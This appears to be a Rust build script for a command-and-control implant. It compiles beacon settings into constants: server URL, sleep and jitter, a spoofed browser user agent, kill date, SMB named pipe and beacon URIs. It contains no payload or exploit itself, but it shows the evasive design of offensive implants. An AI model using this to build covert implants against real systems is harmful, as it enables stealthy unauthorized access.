use std::{env, fs, path::Path};

fn get(name: &str, default: &str) -> String {
    println!("cargo:rerun-if-env-changed={name}");
    env::var(name).unwrap_or_else(|_| default.to_string())
}

fn main() {
    let server_url  = get("AGENT_SERVER_URL",  "http://127.0.0.1:8080");
    let transport   = get("AGENT_TRANSPORT",   "https");
    let sleep_sec   = get("AGENT_SLEEP_SEC",   "60").parse::<u64>().unwrap_or(60);
    let jitter_pct  = get("AGENT_JITTER_PCT",  "20").parse::<u64>().unwrap_or(20);
    let user_agent  = get("AGENT_USER_AGENT",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");
    let kill_date   = get("AGENT_KILL_DATE",   "");
    let smb_pipe    = get("AGENT_SMB_PIPE",    "endgamepipe");
    let beacon_uris = get("AGENT_BEACON_URIS", "");

    // Escape for Rust string literal: backslash and quote
    let escape = |s: &str| s.replace('\\', "\\\\").replace('"', "\\\"");

    let content = format!(
        r#"pub const SERVER_URL:  &str = "{sv}";
pub const TRANSPORT:   &str = "{tr}";
pub const SLEEP_SEC:   u64  = {ss};
pub const JITTER_PCT:  u64  = {jp};
pub const USER_AGENT:  &str = "{ua}";
pub const KILL_DATE:   &str = "{kd}";
pub const SMB_PIPE:    &str = "{sp}";
pub const BEACON_URIS: &str = "{bu}";
"#,
        sv = escape(&server_url),
        tr = escape(&transport),
        ss = sleep_sec,
        jp = jitter_pct,
        ua = escape(&user_agent),
        kd = escape(&kill_date),
        sp = escape(&smb_pipe),
        bu = escape(&beacon_uris),
    );

    let out = env::var("OUT_DIR").unwrap();
    fs::write(Path::new(&out).join("config.rs"), content).unwrap();
}
